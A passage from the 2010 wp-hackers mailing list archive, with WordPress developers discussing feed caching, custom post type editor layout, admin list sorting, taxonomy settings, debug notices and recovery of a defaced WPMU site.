> Say I use xml sitemaps and want the sitemap feed to be 5 minutes but the rss, rss2, atom etc as 12 hours.
>
> -Jason Potkanski
> Tribune Technology

From matt at mattjacob.com  Thu Jul 15 16:36:01 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Thu, 15 Jul 2010 09:36:01 -0700
Subject: [wp-hackers] pipermail busted?
In-Reply-To: <4C3E70AD.70702@gmail.com>
References: <mailman.10476.1279071304.1338.wp-hackers@lists.automattic.com>
	<4C3E70AD.70702@gmail.com>
Message-ID: <4C3F38F1.5080709@mattjacob.com>

On 7/14/10 7:21 PM, Bernard D. Tremblay (ben) wrote:
> /But the most recent post is vm at linksalpha.com's "How to get a plugin
> URL working on WordPress *V M* " ... date-stamp:
> /Thu Jul 1 03:50:23 UTC 2010

You sure about that? If you scroll to the bottom of that page, you'll 
see the latest post (at the time of writing this) is from Otto with a 
timestamp of Thu Jul 15 16:27:49 UTC 2010.

Matt

From dougal at gunters.org  Thu Jul 15 16:54:35 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Thu, 15 Jul 2010 12:54:35 -0400
Subject: [wp-hackers] Clearing Feed Cache?
In-Reply-To: <AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com>
References: <001b01cb23d4$8808ad20$981a0760$@org>	<AANLkTiktfjIVDfA6joFqg9CydvKnmnU_rlnMlOMJex5O@mail.gmail.com>
	<AANLkTim-cRLl7jILdjey-j3ng9u2JkW-gldSHRede3LI@mail.gmail.com>
	<AANLkTiks9T4h8Sd_JyJszVJJ4HTz05ICazFMQCk-wgML@mail.gmail.com>
Message-ID: <4C3F3D4B.9070501@gunters.org>

On Jul 15 2010 3:09 AM, Frank Bueltge wrote:
> add_filter( 'wp_feed_cache_transient_lifetime', create_function( '$a',
> 'return 1800;' ) );
>
> use this filter to set a new time for the cache.
> more also in my post: http://wpengineer.com/feed-cache-in-wordpress/
>
> Best regards
> Frank

If you want to only change the cache lifetime for a particular feed, you 
can use URL matching like I demonstrated here:

   http://dougal.gunters.org/blog/2010/05/20/quick-tip-faster-wordpress-news

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From wordpress at santosj.name  Thu Jul 15 19:10:57 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Thu, 15 Jul 2010 14:10:57 -0500
Subject: [wp-hackers] Active Record / ORM enhancements discussion for WPDB
	class
Message-ID: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>

Really, I want to start by apologizing to someone. I had made the argument a
while back when this was brought before that it would be a "Bad Idea(TM)"
based on performance, lines of code additions, amount of testing involved,
and the hate I had for those two patterns.

I was wrong. After using both the Active Record and ORM patterns in several
libraries, I can admit that the person was correct in that using it eases
SQL queries to the point of no nonsense, "Hey, writing SQL queries is fun
again!" Performance and overhead is minimal enough to not even matter.

There are several problems:

1. Currently there is no code and no code generally means any discussion is
just blowing smoke. The reason to bring this up is generally to weigh debate
as to whether this could ever happen in the current state of WordPress
community and core committers.

2. There are a few libraries currently that implement both (keep in mind
that WPDB was also an external library at one time) and have been around for
quite a while. Most if not all are PHP5+ only, but it is only a matter of
time before WordPress changes over to PHP5+. So if this idea does go
forward, the issue will have to be addressed as to whether the current WPDB
class is extended or an existing library is used.

3. Backwards Compatibility. Given that most if not all plugins that have
their own tables or do their own queries will access the WPDB class and will
expect certain methods and behavior, any changes in library will require the
same behavior be available for at least several versions or so.

4. Dissent within core commit community. I'd have to say that if the leads
say no, then no time should be wasted on it. Of course, this doesn't stop
plugins / themes from using existing libraries or rolling one's own based on
WPDB. The problem is that it would affect extensions to WPDB.

Really, the importance of the discussion / debate based on importance is 4
and 2. Discussions based on 1 and 3 should probably be after 4 and 2.

Jacob Santos

From skeltoac at gmail.com  Thu Jul 15 19:28:35 2010
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu, 15 Jul 2010 14:28:35 -0500
Subject: [wp-hackers] Active Record / ORM enhancements discussion for
	WPDB class
In-Reply-To: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>
References: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>
Message-ID: <AANLkTinjlUSkvr4e0Nm7B8BFd3akP_AAp8qd-R0aBIFi@mail.gmail.com>

On Thu, Jul 15, 2010 at 2:10 PM, Jacob Santos <wordpress at santosj.name> wrote:
> I was wrong. After using both the Active Record and ORM patterns in several
> libraries, I can admit that the person was correct in that using it eases
> SQL queries to the point of no nonsense, "Hey, writing SQL queries is fun
> again!" Performance and overhead is minimal enough to not even matter.

Countless inventions will make SQL seem inferior. Nothing will push it
into obsolescence any time soon. WordPress will keep using SQL until
SQL loses the superior universality it still enjoys.

Unless you love the work and don't care about success in terms of
uptake, it's a waste of time.

Andy

From peter.westwood at ftwr.co.uk  Thu Jul 15 19:40:45 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 15 Jul 2010 20:40:45 +0100
Subject: [wp-hackers] Active Record / ORM enhancements discussion for
	WPDB class
In-Reply-To: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>
References: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>
Message-ID: <92B48E5D-17EE-4833-B734-D7BE5143AFA1@ftwr.co.uk>

Personally I find nothing broken or disruptive to use with what we have.

To me the best thing for the community once the minimum PHP version for WordPress is change is for us to be able to implement new things easier and support the PHP5 only features we already have for all users.

Time spent re-inventing what we have to use new wizz-bangs / patterns / ... that are now more accessible doesn't make keeping everything backward compatible easier - in fact it makes it harder.

Developer time is a limited resource even with the 100s of regular contributors - all that time is best spent on incremental improvements rather than re-inventing wheels

In you want to go a try working on a WordPress like project that is built from the ground up using these newer techniques then you might want to investigate Habari - alot of the good folks that work on that are WordPress alumin and I believe it has a similar flow but is much more 'PHP5'

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From marvinc at gmail.com  Thu Jul 15 23:34:31 2010
From: marvinc at gmail.com (MarvinC)
Date: Thu, 15 Jul 2010 19:34:31 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
Message-ID: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>

Talk about a shock to the system.

Site URL: http://haitistillstands.com
ISP: GoDaddy
Server: Linux
WPMU Version: 2.9.2
BuddyPress: 1.2.x

I can't get into the backend. Is there any way for someone to take a look at
this site and confirm if there's anything I can do to salvage this site?

ANY responses appreciated. Cross-posting to WPMU forums.

From bulk at thecodecave.com  Fri Jul 16 00:22:08 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Thu, 15 Jul 2010 20:22:08 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
In-Reply-To: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>
References: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>
Message-ID: <001501cb247c$eed25ee0$cc771ca0$@com>

It looks like it is a simple defacement.  Deleting index.html will likely
temporarily fix the problem. However, that does nothing to plug the hole.
Your best bet is to delete all the files, reinstall the core WordPress files
and restore from last week's backup of the wp-content. And then uninstall
any plugins you don't HAVE to have and change the rights on  all of your
files to 744.

A hack can be fairly complex, but that's the basic procedure. A detailed
slide by Brad Williams about fixing hacks can be found here:
http://www.slideshare.net/williamsba/now-thats-what-i-call-wordpress-securit
y-2010 

Or contact Brad Williams, myself or the wp-pro mailing list if you just want
this fixed and want to move to a host that can prevent it from happening
again.

And don't worry, you're not alone in having this particular hack happen to
your site http://www.zone-h.org/archive/notifier=Xa7m3d Just make sure you
don't appear in the R column or get a gold star :)

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?eHermitsInc.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From paul at codehooligans.com  Fri Jul 16 01:06:47 2010
From: paul at codehooligans.com (Paul)
Date: Thu, 15 Jul 2010 21:06:47 -0400
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
Message-ID: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>

It's been a while since I've needed to do this but I thought there was a hook that allowed displaying fields, meta box or raw above the Title. 

I'm working on a Custom Post Type system where the client may never enter post content for example. All the important information will be contained in a custom meta box. I know I can not support the title and/or editor when I register the post type. But I do still want these on the page. Just would like my specific meta box. Then the Title.  Then the editor. 

Looking at this another way I know I also have the option to not use the UI, again via the register post type call. But I do want all the listing pages. Just looking for more control over what is on the post admin page. /wp-admin/post.php

P-


From lox.dev at knc.nc  Fri Jul 16 01:12:47 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 16 Jul 2010 12:12:47 +1100
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
Message-ID: <AANLkTikuAmF9XiE_gqx1-1D9Zj0KRCSpVGD7WMa6wWk9@mail.gmail.com>

2010/7/16 Paul <paul at codehooligans.com>:
> It's been a while since I've needed to do this but I thought there was a hook that allowed displaying fields, meta box or raw above the Title.
>
> I'm working on a Custom Post Type system where the client may never enter post content for example. All the important information will be contained in a custom meta box. I know I can not support the title and/or editor when I register the post type. But I do still want these on the page. Just would like my specific meta box. Then the Title. ?Then the editor.
>
> Looking at this another way I know I also have the option to not use the UI, again via the register post type call. But I do want all the listing pages. Just looking for more control over what is on the post admin page. /wp-admin/post.php

http://farinspace.com/move-and-position-wordpress-visual-editor/
-- 
Lox
lox.dev at knc.nc

From lox.dev at knc.nc  Fri Jul 16 01:16:49 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 16 Jul 2010 12:16:49 +1100
Subject: [wp-hackers] Custom post-type post list ordering
Message-ID: <AANLkTimPo1Fe61N2zcFgN-SBneO8MJpTbaj4gANY5GFK@mail.gmail.com>

Hello,

I have a nice custom post type with custom meta field. One of those is
a mysql datetime string (2007/09/12 12:45)

I have added the column date to my custom post-type list. Now what I
wish is to be able to order that list:
1) setting a default ordering based on that datetime meta data
2) being able to order using other columns by clicking the column header

How can I achieve that ?

Regards.

-- 
Lox
lox.dev at knc.nc

From mikeschinkel at newclarity.net  Fri Jul 16 01:24:07 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 15 Jul 2010 21:24:07 -0400
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
Message-ID: <190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>

On Jul 15, 2010, at 9:06 PM, Paul wrote:

> It's been a while since I've needed to do this but I thought there was a hook that allowed displaying fields, meta box or raw above the Title. 
> 
> I'm working on a Custom Post Type system where the client may never enter post content for example. All the important information will be contained in a custom meta box. I know I can not support the title and/or editor when I register the post type. But I do still want these on the page. Just would like my specific meta box. Then the Title.  Then the editor. 
> 
> Looking at this another way I know I also have the option to not use the UI, again via the register post type call. But I do want all the listing pages. Just looking for more control over what is on the post admin page. /wp-admin/post.php

I have a very similar need.  AFAICT it's not possible to move the editor on the server end. Lox provided a nice jQuery solution[1] but I'd prefer not to use jQuery except when it's about interactivity that can't be done on the server and not when it's used to overcome the limitations of output from the current core code on the server. I've seen too many things can go wrong with jQuery solutions of this type.

It's disappointing that title and editor, if used, must be displayed first.  I have a project where the client wants me to display the content editor, with a heading, at the very bottom of the custom post edit screen.  It's also disappointing that the title is coupled with the permalink editor and that it cannot be moved elsewhere using server-side code.

I would definitely be up for adding flexibility in this area for 3.1.  For that matter I'd also like to see plugins be able to add new "supports" features for custom post types with a register_post_type_support() or similar.

-Mike
[1] http://farinspace.com/move-and-position-wordpress-visual-editor/



From paul at codehooligans.com  Fri Jul 16 02:09:54 2010
From: paul at codehooligans.com (Paul)
Date: Thu, 15 Jul 2010 22:09:54 -0400
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
Message-ID: <644541E6-A9BC-476A-95DF-BD73AD6726A6@codehooligans.com>

Lox,

Thanks. I had already found that solution but like Mike I was looking for something a little more like a WordPress hook where I can control things. At the moment this is probably the best solutions. I at least get the editor into a metabox then can be moved done the page. 

Thanks,

P-

On Jul 15, 2010, at 9:24 PM, Mike Schinkel wrote:

> On Jul 15, 2010, at 9:06 PM, Paul wrote:
> 
>> It's been a while since I've needed to do this but I thought there was a hook that allowed displaying fields, meta box or raw above the Title. 
>> 
>> I'm working on a Custom Post Type system where the client may never enter post content for example. All the important information will be contained in a custom meta box. I know I can not support the title and/or editor when I register the post type. But I do still want these on the page. Just would like my specific meta box. Then the Title.  Then the editor. 
>> 
>> Looking at this another way I know I also have the option to not use the UI, again via the register post type call. But I do want all the listing pages. Just looking for more control over what is on the post admin page. /wp-admin/post.php
> 
> I have a very similar need.  AFAICT it's not possible to move the editor on the server end. Lox provided a nice jQuery solution[1] but I'd prefer not to use jQuery except when it's about interactivity that can't be done on the server and not when it's used to overcome the limitations of output from the current core code on the server. I've seen too many things can go wrong with jQuery solutions of this type.
> 
> It's disappointing that title and editor, if used, must be displayed first.  I have a project where the client wants me to display the content editor, with a heading, at the very bottom of the custom post edit screen.  It's also disappointing that the title is coupled with the permalink editor and that it cannot be moved elsewhere using server-side code.
> 
> I would definitely be up for adding flexibility in this area for 3.1.  For that matter I'd also like to see plugins be able to add new "supports" features for custom post types with a register_post_type_support() or similar.
> 
> -Mike
> [1] http://farinspace.com/move-and-position-wordpress-visual-editor/
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From lox.dev at knc.nc  Fri Jul 16 02:15:54 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 16 Jul 2010 13:15:54 +1100
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <644541E6-A9BC-476A-95DF-BD73AD6726A6@codehooligans.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
	<644541E6-A9BC-476A-95DF-BD73AD6726A6@codehooligans.com>
Message-ID: <AANLkTik6aByBvbhk9xQI4TMN_oEXuoiVgoU_GivVyNWR@mail.gmail.com>

I think there is no other solution for now...

Le 16 juil. 2010 13:10, "Paul" <paul at codehooligans.com> a ?crit :
> Lox,
>
> Thanks. I had already found that solution but like Mike I was looking for
something a little more like a WordPress hook where I can control things. At
the moment this is probably the best solutions. I at least get the editor
into a metabox then can be moved done the page.
>
> Thanks,
>
> P-
>
> On Jul 15, 2010, at 9:24 PM, Mike Schinkel wrote:
>
>> On Jul 15, 2010, at 9:06 PM, Paul wrote:
>>
>>> It's been a while since I've needed to do this but I thought there was a
hook that allowed displaying fields, meta box or raw above the Title.
>>>
>>> I'm working on a Custom Post Type system where the client may never
enter post content for example. All the important information will be
contained in a custom meta box. I know I can not support the title and/or
editor when I register the post type. But I do still want these on the page.
Just would like my specific meta box. Then the Title. Then the editor.
>>>
>>> Looking at this another way I know I also have the option to not use the
UI, again via the register post type call. But I do want all the listing
pages. Just looking for more control over what is on the post admin page.
/wp-admin/post.php
>>
>> I have a very similar need. AFAICT it's not possible to move the editor
on the server end. Lox provided a nice jQuery solution[1] but I'd prefer not
to use jQuery except when it's about interactivity that can't be done on the
server and not when it's used to overcome the limitations of output from the
current core code on the server. I've seen too many things can go wrong with
jQuery solutions of this type.
>>
>> It's disappointing that title and editor, if used, must be displayed
first. I have a project where the client wants me to display the content
editor, with a heading, at the very bottom of the custom post edit screen.
It's also disappointing that the title is coupled with the permalink editor
and that it cannot be moved elsewhere using server-side code.
>>
>> I would definitely be up for adding flexibility in this area for 3.1. For
that matter I'd also like to see plugins be able to add new "supports"
features for custom post types with a register_post_type_support() or
similar.
>>
>> -Mike
>> [1] http://farinspace.com/move-and-position-wordpress-visual-editor/
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From johnbillion+wp at gmail.com  Fri Jul 16 02:20:12 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Fri, 16 Jul 2010 03:20:12 +0100
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <AANLkTik6aByBvbhk9xQI4TMN_oEXuoiVgoU_GivVyNWR@mail.gmail.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
	<644541E6-A9BC-476A-95DF-BD73AD6726A6@codehooligans.com>
	<AANLkTik6aByBvbhk9xQI4TMN_oEXuoiVgoU_GivVyNWR@mail.gmail.com>
Message-ID: <AANLkTilmBHSpkiUbVm8RNFEjukczHkTkWMd9IK0Toz1G@mail.gmail.com>

Idea off the top of my head: If you're only concerned with custom post
types and want to avoid the jQuery approach, you could achieve it by
not giving your custom post type the 'editor' or 'title' functionality
and then defining your own meta boxes which contain these fields and
which are then positionable. An inelegant solution I know, but it
would work for now.

Note: not sure about JavaScript enqueing and form processing etc when
you don't enable these fields, try it and see I guess!

John

On Fri, Jul 16, 2010 at 3:15 AM, Lox <lox.dev at knc.nc> wrote:
> I think there is no other solution for now...
>
> Le 16 juil. 2010 13:10, "Paul" <paul at codehooligans.com> a ?crit :
>> Lox,
>>
>> Thanks. I had already found that solution but like Mike I was looking for
> something a little more like a WordPress hook where I can control things. At
> the moment this is probably the best solutions. I at least get the editor
> into a metabox then can be moved done the page.
>>
>> Thanks,
>>
>> P-
>>
>> On Jul 15, 2010, at 9:24 PM, Mike Schinkel wrote:
>>
>>> On Jul 15, 2010, at 9:06 PM, Paul wrote:
>>>
>>>> It's been a while since I've needed to do this but I thought there was a
> hook that allowed displaying fields, meta box or raw above the Title.
>>>>
>>>> I'm working on a Custom Post Type system where the client may never
> enter post content for example. All the important information will be
> contained in a custom meta box. I know I can not support the title and/or
> editor when I register the post type. But I do still want these on the page.
> Just would like my specific meta box. Then the Title. Then the editor.
>>>>
>>>> Looking at this another way I know I also have the option to not use the
> UI, again via the register post type call. But I do want all the listing
> pages. Just looking for more control over what is on the post admin page.
> /wp-admin/post.php
>>>
>>> I have a very similar need. AFAICT it's not possible to move the editor
> on the server end. Lox provided a nice jQuery solution[1] but I'd prefer not
> to use jQuery except when it's about interactivity that can't be done on the
> server and not when it's used to overcome the limitations of output from the
> current core code on the server. I've seen too many things can go wrong with
> jQuery solutions of this type.
>>>
>>> It's disappointing that title and editor, if used, must be displayed
> first. I have a project where the client wants me to display the content
> editor, with a heading, at the very bottom of the custom post edit screen.
> It's also disappointing that the title is coupled with the permalink editor
> and that it cannot be moved elsewhere using server-side code.
>>>
>>> I would definitely be up for adding flexibility in this area for 3.1. For
> that matter I'd also like to see plugins be able to add new "supports"
> features for custom post types with a register_post_type_support() or
> similar.
>>>
>>> -Mike
>>> [1] http://farinspace.com/move-and-position-wordpress-visual-editor/
>>>
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 16 02:40:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 15 Jul 2010 21:40:15 -0500 (CDT)
Subject: [wp-hackers] Adding field(s) before Title and post content
	on	custom post type
In-Reply-To: <AANLkTilmBHSpkiUbVm8RNFEjukczHkTkWMd9IK0Toz1G@mail.gmail.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
	<644541E6-A9BC-476A-95DF-BD73AD6726A6@codehooligans.com>
	<AANLkTik6aByBvbhk9xQI4TMN_oEXuoiVgoU_GivVyNWR@mail.gmail.com>
	<AANLkTilmBHSpkiUbVm8RNFEjukczHkTkWMd9IK0Toz1G@mail.gmail.com>
Message-ID: <DC0B9E54-0696-4B10-809E-BFEAA805E099@newclarity.net>

On Jul 15, 2010, at 10:20 PM, John Blackbourn <johnbillion+wp at gmail.com> wrote:
> Idea off the top of my head: If you're only concerned with custom post
> types and want to avoid the jQuery approach, you could achieve it by
> not giving your custom post type the 'editor' or 'title' functionality
> and then defining your own meta boxes which contain these fields and
> which are then positionable. An inelegant solution I know, but it

> would work for now.

Thanks for the though. That's exactly what I've had to do. Yes it works but it's inelegant as heck and more obscure code to maintain than I would like.

-Mike

From dvmorris at gmail.com  Fri Jul 16 03:13:25 2010
From: dvmorris at gmail.com (David Morris)
Date: Thu, 15 Jul 2010 22:13:25 -0500
Subject: [wp-hackers] Sharing and Reskinning Blog Post Content Across
	Multiple Blogs
Message-ID: <AANLkTilpLVayrJe9jCsqYTlk6AI0JWjESLzzHf66MevV@mail.gmail.com>

I am running MU 2.91 right now (soon upgrading to Multi-Network 3.0), and
I'm looking for a way to be able to share full blog post content across
multiple blogs with different themes.

If a post is used on more than one blog, each instance of the post would
need to have its own comment stream. Is there an easy way to approach this
without duplicating the post content over to each blog that wants to use it?


Our current idea is to use FeedWordPress along with full content RSS feeds
to simply duplicate the post content from each central blog to all of the
replica blogs, with different themes applied. However, this causes issues if
posts are deleted or updated on the central blog, and it also causes a lot
of content to be duplicated all over the database.


Some other ideas we are kicking around:

   - Create a plugin to automate the creation of master and replica blogs
   with proper themes/plugins applied
   - Create a plugin that makes each replica blog pull blog post content
   from another blog's wp_x_posts table
      - Either use the master blog's comments table and add an extra field
      to denote which replica blog the comment belongs to
      - Or use the replica blog comments table
   - Use a third party commenting system, like echo or pluck, and write a
   plugin to generate unique post id's per replica blog
   - Figure out a more automated way to propagate post deletions from the
   master blog to the replica blogs



Any ideas you guys might have would be greatly appreciated. Thanks for your
help,

Dave Morris

From lox.dev at knc.nc  Fri Jul 16 03:26:19 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 16 Jul 2010 14:26:19 +1100
Subject: [wp-hackers] Add hierarchical to the link_category taxonomy
Message-ID: <AANLkTimvvj3Xw89EM93I6d4lbpkCZcibhGb5S9OpBYKu@mail.gmail.com>

Hi,

I simply want the links categories to have hierarchical=true, so looking at
 http://codex.wordpress.org/Function_Reference/register_taxonomy, it is said:

"This function adds or overwrites a taxonomy."

So, basically, this should add hierarchical to the link_category taxonomy ?

register_taxonomy( 'link_category', 'link', array('hierarchical' => true));

It does not ...

--
Lox
lox.dev at knc.nc

From peter.westwood at ftwr.co.uk  Fri Jul 16 06:46:07 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 16 Jul 2010 07:46:07 +0100
Subject: [wp-hackers] Custom post-type post list ordering
In-Reply-To: <AANLkTimPo1Fe61N2zcFgN-SBneO8MJpTbaj4gANY5GFK@mail.gmail.com>
References: <AANLkTimPo1Fe61N2zcFgN-SBneO8MJpTbaj4gANY5GFK@mail.gmail.com>
Message-ID: <569FBE13-00E8-4E90-AA1D-A3ECC723BB83@ftwr.co.uk>


On 16 Jul 2010, at 02:16, Lox wrote:

> Hello,
> 
> I have a nice custom post type with custom meta field. One of those is
> a mysql datetime string (2007/09/12 12:45)
> 
> I have added the column date to my custom post-type list. Now what I
> wish is to be able to order that list:
> 1) setting a default ordering based on that datetime meta data
> 2) being able to order using other columns by clicking the column header
> 
> How can I achieve that ?
> 

I suggest that you look at this GSOC project which is working on adding sorting to lots of different admin lists

http://gsoc2010.wordpress.com/silviu-cristian-burca-ajaxify-admin/

Also talking to scribu directly may gain you some insight

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From wordpress at dd32.id.au  Fri Jul 16 07:26:18 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 16 Jul 2010 17:26:18 +1000
Subject: [wp-hackers] Add hierarchical to the link_category taxonomy
In-Reply-To: <AANLkTimvvj3Xw89EM93I6d4lbpkCZcibhGb5S9OpBYKu@mail.gmail.com>
References: <AANLkTimvvj3Xw89EM93I6d4lbpkCZcibhGb5S9OpBYKu@mail.gmail.com>
Message-ID: <op.vfxdl4ygspxmuu@ho.st>

On Fri, 16 Jul 2010 13:26:19 +1000, Lox <lox.dev at knc.nc> wrote:

> Hi,
>
> I simply want the links categories to have hierarchical=true, so looking  
> at
>  http://codex.wordpress.org/Function_Reference/register_taxonomy, it is  
> said:
>
> "This function adds or overwrites a taxonomy."
>
> So, basically, this should add hierarchical to the link_category  
> taxonomy ?
>
> register_taxonomy( 'link_category', 'link', array('hierarchical' =>  
> true));
>
> It does not ...
>

It will override it. However, There is a "but" to the idea:

Link Category admin management is NOT controlled by the generic taxonomy  
interface; I'll change that over in 3.1 most likely.

So you can visit edit-tags.php?taxonomy=link_category and you should be  
presented with a hierarchical category page.

The Links addition page may not be coded to expect a hierarchical taxonomy  
either, so it may be displayed as a flat list..

-- 
Dion Hulse / dd32
Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From steelerbg at gmail.com  Fri Jul 16 10:15:36 2010
From: steelerbg at gmail.com (SteeleR)
Date: Fri, 16 Jul 2010 13:15:36 +0300
Subject: [wp-hackers] wp_dashboard_setup execution time (after plugins)
Message-ID: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>

Hi.. i'm trying to add a new widget to the dashboard and the new widget is
actually getting its content from an already installed plugin. The problem
is that the wp_dashboard_setup is firing before the plugins are loaded so
the plugin function are non-existing..

How to activate it after the plugins are loaded.

The code I have is:

function my_wp_dashboard_setup()

{

custom_plugin_function();

}



> add_action('wp_dashboard_setup', 'my_wp_dashboard_setup');



Thanks

From andrew at graymerica.com  Fri Jul 16 15:04:42 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Fri, 16 Jul 2010 11:04:42 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
Message-ID: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>

Does anyone have a good solutions to have wordpress only show fatal errors and not show Notices when I turn the wp-config DEBUG variable on.

I just want to develop with fatal errors and not get all the Notices from plugins and other sources,

is there a filter or action for setting the error reporting

thanks,

Andrew



From scribu at gmail.com  Fri Jul 16 15:07:24 2010
From: scribu at gmail.com (scribu)
Date: Fri, 16 Jul 2010 18:07:24 +0300
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
Message-ID: <AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>

On Fri, Jul 16, 2010 at 6:04 PM, Andrew Gray <andrew at graymerica.com> wrote:

> Does anyone have a good solutions to have wordpress only show fatal errors
> and not show Notices when I turn the wp-config DEBUG variable on.
>

Well, you could use PHP's error_reporting() function directly.

Also, adding ini_set('display_errors', true); is usually enough.


-- 
http://scribu.net

From otto at ottodestruct.com  Fri Jul 16 15:39:36 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Jul 2010 10:39:36 -0500
Subject: [wp-hackers] wp_dashboard_setup execution time (after plugins)
In-Reply-To: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>
References: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>
Message-ID: <AANLkTinX3w5PLz_3PnJFXIMKDPDd4ikx7ELDGFtEKSdo@mail.gmail.com>

On Fri, Jul 16, 2010 at 5:15 AM, SteeleR <steelerbg at gmail.com> wrote:
> Hi.. i'm trying to add a new widget to the dashboard and the new widget is
> actually getting its content from an already installed plugin. The problem
> is that the wp_dashboard_setup is firing before the plugins are loaded so
> the plugin function are non-existing..

No, the wp_dashboard_setup function isn't called until well after the
plugins are already loaded. Your problem must lie elsewhere, somehow.

-Otto

From steelerbg at gmail.com  Fri Jul 16 15:41:29 2010
From: steelerbg at gmail.com (SteeleR)
Date: Fri, 16 Jul 2010 18:41:29 +0300
Subject: [wp-hackers] wp_dashboard_setup execution time (after plugins)
In-Reply-To: <AANLkTinX3w5PLz_3PnJFXIMKDPDd4ikx7ELDGFtEKSdo@mail.gmail.com>
References: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>
	<AANLkTinX3w5PLz_3PnJFXIMKDPDd4ikx7ELDGFtEKSdo@mail.gmail.com>
